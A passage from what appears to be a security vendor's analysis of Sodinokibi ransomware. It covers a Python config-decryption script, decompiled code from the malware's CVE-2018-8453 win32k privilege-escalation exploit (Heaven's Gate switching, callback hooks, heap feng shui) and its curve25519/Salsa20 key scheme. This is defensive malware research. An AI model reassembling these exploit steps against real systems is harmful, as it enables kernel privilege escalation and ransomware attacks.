<p>&nbsp; &nbsp; s <b>=</b> range<b>(</b>256<b>)<br>  </b>&nbsp; &nbsp; j <b>=</b> 0<br> &nbsp; &nbsp;&nbsp;<b>for</b> i <b>in</b> range<b>(</b>256<b>):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; j <b>=</b> <b>(</b>j <b>+</b> s<b>[</b>i<b>]</b> <b>+</b> rc4key<b>[</b>i <b>%</b> keylen<b>])</b> <b>%</b> 256<br> &nbsp; &nbsp; &nbsp; &nbsp; s<b>[</b>i<b>],</b> s<b>[</b>j<b>]</b> <b>=</b> s<b>[</b>j<b>],</b> s<b>[</b>i<b>]<br>  <br>  </b>&nbsp; &nbsp; i <b>=</b> 0<br> &nbsp; &nbsp; j <b>=</b> 0<br> &nbsp; &nbsp; keystream <b>=</b> <b>[]<br>  </b>&nbsp; &nbsp;&nbsp;<b>for</b> i <b>in</b> range<b>(</b>enclen<b>):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; i <b>=</b> <b>(</b>i <b>+</b> 1<b>)</b> <b>%</b> 256<br> &nbsp; &nbsp; &nbsp; &nbsp; j <b>=</b> <b>(</b>j <b>+</b> s<b>[</b>i<b>])</b> <b>%</b> 256<br> &nbsp; &nbsp; &nbsp; &nbsp; s<b>[</b>i<b>],</b> s<b>[</b>j<b>]</b> <b>=</b> s<b>[</b>j<b>],</b> s<b>[</b>i<b>]<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; k <b>=</b> s<b>[(</b>s<b>[</b>i<b>]</b> <b>+</b> s<b>[</b>j<b>])</b> <b>%</b> 256<b>]<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; keystream<b>.</b>append<b>(</b>k<b>)<br>  <br>  </b>&nbsp; &nbsp;&nbsp;<b>for</b> e<b>,</b> k <b>in</b> zip<b>(</b>enc<b>,</b> keystream<b>):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; dec <b>+=</b> chr<b>(</b>e <b>^</b> k<b>)</b>&nbsp; &nbsp; &nbsp;</p> <p>&nbsp;&nbsp;&nbsp; <b>return</b> dec</p> <p><b>def</b> extract_sodinokibi_config<b>(</b>filename<b>):<br>  </b>&nbsp; &nbsp;&nbsp;<b>print(</b>filename<b>)<br>  </b>&nbsp; &nbsp;&nbsp;<b>try:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; pe <b>=</b> pefile<b>.</b>PE<b>(</b>filename<b>)</b></p> <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; section <b>=</b> pe<b>.</b>sections<b>[</b>3<b>]<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; data <b>=</b> section<b>.</b>get_data<b>()<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; enc_len <b>=</b> struct<b>.</b>unpack<b>(</b>'I'<b>,</b> data<b>[</b>0x24<b>:</b>0x28<b>])[</b>0<b>]<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; dec_data <b>=</b> rc4<b>(</b>data<b>[</b>0<b>:</b>32<b>],</b> data<b>[</b>0x28<b>:</b>enc_len <b>+</b> 0x28<b>])</b></p> <p>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>print(</b>json<b>.</b>dumps<b>(</b>json<b>.</b>loads<b>(</b>filter<b>(lambda</b> x<b>:</b> x <b>in</b> string<b>.</b>printable<b>,</b> dec_data<b>)),</b> indent<b>=</b>2<b>,</b> sort_keys<b>=True))<br>  </b>&nbsp; &nbsp;&nbsp;<b>except</b> Exception <b>as</b> e<b>:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>print(</b>&quot;ERROR - {}&quot;<b>.</b>format<b>(</b>e<b>))</b></p> <p><b>def</b> main<b>():<br>  </b>&nbsp; &nbsp;&nbsp;<b>if</b> os<b>.</b>path<b>.</b>isdir<b>(</b>sys<b>.</b>argv<b>[</b>1<b>]):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>for</b> root<b>,</b> dirs<b>,</b> files <b>in</b> scandir<b>.</b>walk<b>(</b>sys<b>.</b>argv<b>[</b>1<b>]):<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>for</b> file <b>in</b> files<b>:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extract_sodinokibi_config<b>(</b>os<b>.</b>path<b>.</b>join<b>(</b>root<b>,</b> file<b>))<br>  </b>&nbsp; &nbsp;&nbsp;<b>else:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; extract_sodinokibi_config<b>(</b>sys<b>.</b>argv<b>[</b>1<b>])</b></p> <p><b>if</b> __name__ <b>==</b> &quot;__main__&quot;<b>:<br>  </b>&nbsp; &nbsp;&nbsp;<b>try:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp; main<b>()<br>  </b>&nbsp; &nbsp;&nbsp;<b>except</b> KeyboardInterrupt<b>:<br>  </b>&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<b>pass</b></p> </td> </tr></tbody></table> <p><i>Figure 10: Python script for decoding configuration</i></p> <h3>Privilege Escalation</h3> <p>If the <b>exp</b> (exploit) value in the config is set to &quot;true&quot;, and the file timestamps of win32k.sys and win32kfull.sys are below 2018/09/11-00:00:00, the malware will attempt to exploit a vulnerability in win32k.sys (<b>CVE-2018-8453</b>) in order to perform privilege escalation to elevate to SYSTEM, before running the ransomware routine. Both 32-bit and 64-bit versions of the exploit code are stored inside the <b>.rdata</b> section of the binary and depending on the system architecture one of these code portions will be copied to a readable/writable/executable (RWX) memory region and executed.</p> <p>Then things get very interesting. Despite being a 32-bit application, Sodinokibi contains both 32 and 64-bit exploit code. When Sodinokibi detects that it is running as a 32-bit process on a 64-bit system, it will utilize a seldom seen technique called &quot;<a href="http://www.alex-ionescu.com/?p=300" target="_blank">Heaven's Gate</a>&quot; to transition to 64-bit mode, and repeatedly switch in and out of 32/64-bit mode whilst running portions of the exploit code. The actual transition is also interesting, in that it calls into the middle of an opcode (push 0x00cb0033) to trigger the switch from 32 to 64-bit mode.</p> <p>In the code below, the x86_to_x64 function will preserve the code-selector (CS) register on the stack (which will be 0x23 for x86 mode). After calling into the Heaven's_Gate function, the value 0x00CB0033 is pushed to the stack, and the next call instruction will call into the middle of the push opcode, starting at the 0xCB byte, which corresponds to a retf opcode.</p> <p>The retf differs from a regular ret opcode in that it will not only pop the return address off the stack, but also a new CS value, in this case 0x33. With the new CS value in place, the segment-selector will now point to a different GDT entry that has a bit set to specify that it is an x64 code descriptor, and execution will then resume after the final call instruction in 64-bit mode. Returning from 64-bit mode back to 32-bit is a simple reverse operation using a retf with the 32-bit CS (0x23) and EIP on the stack:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">debug032:00075DF0 x86_to_x64 proc near<br> debug032:00075DF0 push&nbsp;&nbsp;&nbsp; ebp<br> debug032:00075DF1 mov&nbsp;&nbsp;&nbsp;&nbsp; ebp, esp<br> debug032:00075DF3 push&nbsp;&nbsp;&nbsp; ebx<br> debug032:00075DF4 push&nbsp;&nbsp;&nbsp; esi<br> debug032:00075DF5 push&nbsp;&nbsp;&nbsp; edi<br> debug032:00075DF6 push&nbsp;&nbsp;&nbsp; cs&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;; Preserve x86 CS<br> debug032:00075DF7 call&nbsp;&nbsp;&nbsp; heavens_gate<br> debug032:00075DFC pop&nbsp;&nbsp;&nbsp;&nbsp; edi<br> debug032:00075DFD pop&nbsp;&nbsp;&nbsp;&nbsp; esi<br> debug032:00075DFE pop&nbsp;&nbsp;&nbsp;&nbsp; ebx<br> debug032:00075DFF leave<br> debug032:00075E00 retn<br> debug032:00075E00 x86_to_x64 endp<br> debug032:00075E00<br> debug032:00075E01 heavens_gate:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;<br> debug032:00075E01 push&nbsp;&nbsp;&nbsp; <b>0CB0033h&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 0xCB = retf, 0x33 = new CS (x64)<br> debug032:00075E06 call&nbsp;&nbsp;&nbsp; near ptr heavens_gate+3debug032:00075E0B inc&nbsp;&nbsp;&nbsp;&nbsp; ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Execution resumes in x64 mode</td> </tr></tbody></table> <p><i>Figure 11: Heaven's Gate</i></p> <p>Regardless of the x86/64 code path taken, and the fact that the x64 code requires considerably more loading (as it has to walk the imports for Sodinokibi and load all libraries and resolve all imports), both the x86/64 exploit code ultimately operate in a relatively similar manner, broadly in line with previous research from <a href="https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/" target="_blank">Kaspersky</a>, although containing subtle differences to heap feng shui routines and certain class names.</p> <p>The exploit ultimately operates by hooking functions in the KernelCallbackTable (fnDWORD, fnNCDESTROY, and fnINLPCREATESTRUCT):</p> <p style="text-align: left;"><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig12-sodinokibi.png"><i><br> Figure 12: Hooks in KernelCallbackTable</i></p> <p>The exploit code first creates a window named &quot;sysshadow&quot;, as well as a scrollbar:<br> </p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">int __stdcall CreateScrollBarWindowProc(HWND hWndParent, UINT uMsg, WPARAM wParam, LPARAM lParam)<br> {<br> &nbsp; LPVOID v1; // esi<br> &nbsp; DWORD dwClassLong; // eax<br> <br> &nbsp; v1 = TlsGetValue(dwTlsIndex);<br> &nbsp; if ( v1 )<br> &nbsp; {<br> &nbsp; &nbsp; if ( uMsg == 1 )<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; *((_DWORD *)v1 + 64) = CreateWindowExA(0, ”SCROLLBAR”, 0, 0x50000001u, 0, 0, 0, 0, hWndParent, 0, hInstance, 0);<br> &nbsp; &nbsp; &nbsp; dwClassLong = GetClassLongA(hWndParent, GCL_STYLE);<br> &nbsp; &nbsp; &nbsp; SetClassLongA(hWndParent, GCL_STYLE, dwClassLong | 0x20000);<br> &nbsp; &nbsp; }<br> &nbsp; &nbsp; else<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; if ( uMsg != 2 )<br> &nbsp; &nbsp; &nbsp; &nbsp; return NtdllDefWindowProc_A(hWndParent, uMsg, wParam, lParam);<br> &nbsp; &nbsp; &nbsp; PostQuitMessage(0);<br> &nbsp; &nbsp; }<br> &nbsp; }<br> &nbsp; return 0;<br> }</td> </tr></tbody></table> <p><i>Figure 13: Scrollbar creation</i></p> <p>After which it sets the window position under the fnINLPCREATESTRUCT hook:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p>int __stdcall fnINLPCREATESTRUCT_hook_x86(int a1)<br> {<br> &nbsp; _DWORD *v1; // esi<br> &nbsp; int v2; // ebx<br> &nbsp; BOOL v3; // eax<br> &nbsp; CHAR ClassName; // [esp+8h] [ebp-104h]</p> <p>&nbsp; v1 = TlsGetValue(dwTlsIndex);<br> &nbsp; if ( v1 )<br> &nbsp; {<br> &nbsp; &nbsp; if ( a1 )<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; if ( GetCurrentThreadId() == v1[53] )<br> &nbsp; &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; &nbsp; v2 = **(_DWORD **)(a1 + 24);<br> &nbsp; &nbsp; &nbsp; &nbsp; if ( GetClassNameA(**(HWND **)(a1 + 24), &amp;ClassName, 260) )<br> &nbsp; &nbsp; &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( !v1[65] )<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( strcmpi(&amp;ClassName, ”sysshadow”) )<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( strcmpi(&amp;ClassName, ” msctfime ui”) )<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return fnINLPCREATESTRUCT(a1);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v3 = 1;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v1[65] = v2;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; v3 = v1[79] == 0;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ( v3 )<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; set_window_pos(v1);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br> &nbsp; &nbsp; &nbsp; &nbsp; }<br> &nbsp; &nbsp; &nbsp; }<br> &nbsp; &nbsp; }<br> &nbsp; }<br> &nbsp; return fnINLPCREATESTRUCT (a1);<br> }</p> </td> </tr></tbody></table> <p><i>Figure 14: fnINLPCREATESTRUCT hook</i></p> <p>The fnDWORD hook is trigged by issuing a left mouse click to the scrollbar:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><br> PostMessageA(*((HWND *)lpThreadParameter + 64), WM_LBUTTONDOWN, 1u, 1);<br> &nbsp;</td> </tr></tbody></table> <p><br> From within the fnDWORD hook, the scrollbar is ultimately freed…</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">DWORD __stdcall fnDWORD_hook_x86(int a1)<br> {<br> &nbsp; int v1; // ebx<br> &nbsp; DWORD result; // eax<br> &nbsp; _DWORD *v3; // esi<br> &nbsp; HWND v4; // [esp-8h] [ebp-Ch]<br> <br> &nbsp; v1 = *(unsigned __int16 *)(a1 + 4);<br> &nbsp; if ( (_WORD)v1 == 647 )<br> &nbsp; {<br> &nbsp; &nbsp; a1 = 0;<br> &nbsp; &nbsp; return NtCallbackReturn(&amp;a1, 12, 0);<br> &nbsp; }<br> &nbsp; v3 = TlsGetValue(dwTlsIndex);<br> &nbsp; if ( !v3 )<br> &nbsp; &nbsp; goto LABEL_14;<br> &nbsp; result = GetCurrentThreadId();<br> &nbsp; if ( result != v3[53] || !*((_BYTE *)v3 + 332) || v3[51] )<br> &nbsp; &nbsp; goto LABEL_14;<br> &nbsp; if ( !v3[80] || v1 != 31 )<br> &nbsp; {<br> &nbsp; &nbsp; if ( version_sth_0 &lt; 16 &amp;&amp; v1 == 6 )<br> &nbsp; &nbsp; &nbsp; set_window_pos(v3);<br> &nbsp; &nbsp; if ( v1 == 112 )<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; v4 = (HWND)v3[62];<br> &nbsp; &nbsp; &nbsp; *((_BYTE *)v3 + 332) = 2;<br> &nbsp; &nbsp; &nbsp; SetActiveWindow(v4);<br> &nbsp; &nbsp; &nbsp; SendMessageA((HWND)v3[62], WM_SYSCOMMAND, SC_KEYMENU, 0);<br> &nbsp; &nbsp; &nbsp; <b>DestroyWindow((HWND)v3[64]);</b><br> &nbsp; &nbsp; &nbsp; *((_BYTE *)v3 + 332) = 4;<br> &nbsp; &nbsp; }<br> LABEL_14:<br> &nbsp; &nbsp; result = fnDWORD(a1);<br> &nbsp; }<br> &nbsp; return result;<br> }</td> </tr></tbody></table> <p><i>Figure 15: fnDWORD hook</i></p> <p>… leading to the fnNCDESTROY hook gaining execution, where calling NtUserSetWindowFNID erroneously allows the free'd scrollbar to be marked as a button (instead of free). This causes the &quot;sysshadow&quot; window to retain a reference to the free'd memory:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">_WORD *__stdcall fnNCDESTROY_hook_x86(_DWORD **a1)<br> {<br> &nbsp; &nbsp; &lt;snip&gt;<br> <br> &nbsp; &nbsp; SendMessageA(v20, WM_CANCELMODE, 0, 0);<br> &nbsp; &nbsp; v17 = (HWND *)(v4 + 681);<br> &nbsp; &nbsp; do<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; SetClassLongW(*v17, GCL_MENUNAME, 0);<br> &nbsp; &nbsp; &nbsp; v17 += 5;<br> &nbsp; &nbsp; &nbsp; --v11;<br> &nbsp; &nbsp; }<br> &nbsp; &nbsp; while ( v11 );<br> &nbsp; &nbsp; v18 = (HWND *)(v4 + 6825);<br> &nbsp; &nbsp; v19 = 128;<br> &nbsp; &nbsp; do<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; *(_DWORD *)(v4 + 8) = v23++;<br> &nbsp; &nbsp; &nbsp; SetClassLongW(*v18, GCL_MENUNAME, v4);<br> &nbsp; &nbsp; &nbsp; v18 += 4;<br> &nbsp; &nbsp; &nbsp; --v19;<br> &nbsp; &nbsp; }<br> &nbsp; &nbsp; while ( v19 );<br> &nbsp; &nbsp; result = v22;<br> &nbsp; &nbsp; v1 = 1;<br> &nbsp; &nbsp; v8 = v21;<br> &nbsp; }<br> &nbsp; if ( v8 == *(_DWORD *)(v4 + 260) &amp;&amp; *result == (unsigned __int16)<b>FNID_FREED</b> &amp;&amp; !*(_DWORD *)(v4 + 324) )<br> &nbsp; {<br> &nbsp; &nbsp; result = (_WORD *)<b>NtUserSetWindowFNID</b>(*(_DWORD *)(v4 + 244), <b>FNID_BUTTON</b>);<br> &nbsp; &nbsp; *(_DWORD *)(v4 + 324) = result;<br> &nbsp; &nbsp; v1 = 1;<br> &nbsp; }<br> &nbsp; if ( !v1 )<br> &nbsp; {<br> &nbsp; &nbsp; v3 = a1;<br> LABEL_26:<br> &nbsp; &nbsp; result = (_WORD *)fnNCDESTROY(v3);<br> &nbsp; }<br> &nbsp; return result;<br> }</td> </tr></tbody></table> <p><i>Figure 16: fnNCDESTROY hook</i></p> <p>Heap feng shui is then triggered from a windows event hook when the EVENT_OBJECT_DESTROY event occurs on the scrollbar, in order to reclaim the freed memory:</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top"><p>int __fastcall ntuser_thunked_menu_item_info(_DWORD *a1, int a2, int a3)<br> {<br> &nbsp; int result; // eax<br> &nbsp; int *v4; // edi<br> &nbsp; int v5; // ebx<br> &nbsp; int v6; // [esp-18h] [ebp-5Ch]<br> &nbsp; MENUITEMINFOW sMenuItemInfo; // [esp+Ch] [ebp-38h]<br> &nbsp; int v8; // [esp+3Ch] [ebp-8h]</p> <p>&nbsp; result = 0;<br> &nbsp; v8 = a2;<br> &nbsp; v4 = a1;<br> &nbsp; if ( a3 )<br> &nbsp; {<br> &nbsp; &nbsp; if ( windows_10_version == 10 )<br> &nbsp; &nbsp; &nbsp; v5 = ' ';<br> &nbsp; &nbsp; else<br> &nbsp; &nbsp; &nbsp; v5 = aDp8lDp8lDp8l_0[7 * windows_10_version + 6];<br> &nbsp; &nbsp; j_memset(&amp;sMenuItemInfo, 0, 48);<br> &nbsp; &nbsp; sMenuItemInfo.cbSize = sizeof(MENUITEMINFOW);<br> &nbsp; &nbsp; sMenuItemInfo.fMask = MIIM_ID;<br> &nbsp; &nbsp; sMenuItemInfo.wID = a3 - v5;<br> &nbsp; &nbsp; result = NtUserThunkedMenuItemInfo(v4[59], v4[73] + 9, 1, 0, (int)&amp;sMenuItemInfo, 0);<br> &nbsp; &nbsp; if ( result )<br> &nbsp; &nbsp; {<br> &nbsp; &nbsp; &nbsp; sMenuItemInfo.dwItemData = v8;<br> &nbsp; &nbsp; &nbsp; v6 = v4[60];<br> &nbsp; &nbsp; &nbsp; sMenuItemInfo.fMask = MIIM_DATA;<br> &nbsp; &nbsp; &nbsp; result = NtUserThunkedMenuItemInfo(v6, 0, 1, 0, (int)&amp;sMenuItemInfo, 0);<br> &nbsp; &nbsp; }<br> &nbsp; }<br> &nbsp; return result;<br> }</p> </td> </tr></tbody></table> <p><i>Figure 17: Portion of heap feng shui code</i></p> <p>With the freed memory reclaimed, the exploit then establishes and operates arbitrary kernel memory read/write primitives, which are used to locate the System process token from the EPROCESS structure and copy it to its own EPROCESS structure, resulting in SYSTEM privileges for the ransomware:</p> <p style="text-align: center;"><img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/fig18-sodinokibi.png"><i><br> Figure 18: Ransomware now running as SYSTEM</i></p> <p>Given the complexities of the exploit, heap feng shui, and trigger mechanisms, BlackBerry Cylance researchers aim to explore this further as part of a separate blog article.<br> </p> <h3>File Encryption</h3> <p>In terms of encryption, Sodinokibi uses a symmetric algorithm (Salsa20 for files, AES-256-CTR for registry values and C2 beacons) in conjunction with an asymmetric key exchange method based on the curve25519 implementation.</p> <p>In the first step, a main curve25519 key pair is generated for the victim. The public key from this pair will later be used to derive the Salsa20 keys for file encryption. The secret/private key (needed for file decryption) is initiated using a fairly sophisticated AES-based PRNG algorithm with a hardcoded seed, and then encrypted with AES-256 in CTR mode and saved to the registry. The AES key used in that process is a SHA3-256 sum of the shared secret derived from the private key of a secondary curve25519 generated key pair and the attacker’s public key stored in the <b>pk</b> section of the configuration.</p> <p>In fact, the malware stores two versions of the victim’s private key, one which is encrypted with a key derived by using the public key delivered through the config’s <b>pk</b> value, and one which is encrypted using a key derived with the use of a hardcoded public key stored in the binary’s <b>.data</b> section. Both of these values are later appended to each encrypted file, which suggests that the hardcoded public key might have been embedded by the malware developers as a &quot;master key&quot; in order to give them the ability of decrypting files encrypted by affiliates:&nbsp;</p> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="719" valign="top">.text:00402416 generate_keys:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; CODE XREF: generate_keys_set_reg_values+1A8↑j<br> .text:00402416&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; generate_keys_set_reg_values+1AE↑j ...<br> .text:00402416&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea &nbsp;&nbsp;&nbsp;&nbsp;eax, [ebp+victim_main_privkey]<br> .text:0040241C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; offset victim_main_pubkey<br> .text:00402421&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; eax<br> .text:00402422&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; generate_curve25519_keypair ; generate victim's main key pair<br> .text:00402427&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; 20h<br> .text:00402429&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp;&nbsp; edi<br> .text:0040242A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+encprivkey_metadata_1_len]<br> .text:0040242D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [ebp+victim_pubkey_len], edi<br> .text:00402430&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; &nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; out_len<br> .text:00402431&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; data_len<br> .text:00402432&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp;&nbsp; eax, [ebp+victim_main_privkey]<br> .text:00402438&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; [ebp+attacker_pubkey_len], edi<br> .text:0040243B&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; datain<br> .text:0040243C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp;&nbsp; offset affiliate_pubkey<br> .text:00402441&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp;&nbsp; curve25519_aes_encrypt ;<br> .text:00402441&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; generate victim's secondary key pair and derive<br> .text:00402441&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; key for AES-256-CTR encryption using curve25519<br> .text:00402441&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; with priv key from this pair &amp; pub key from cfg<br> 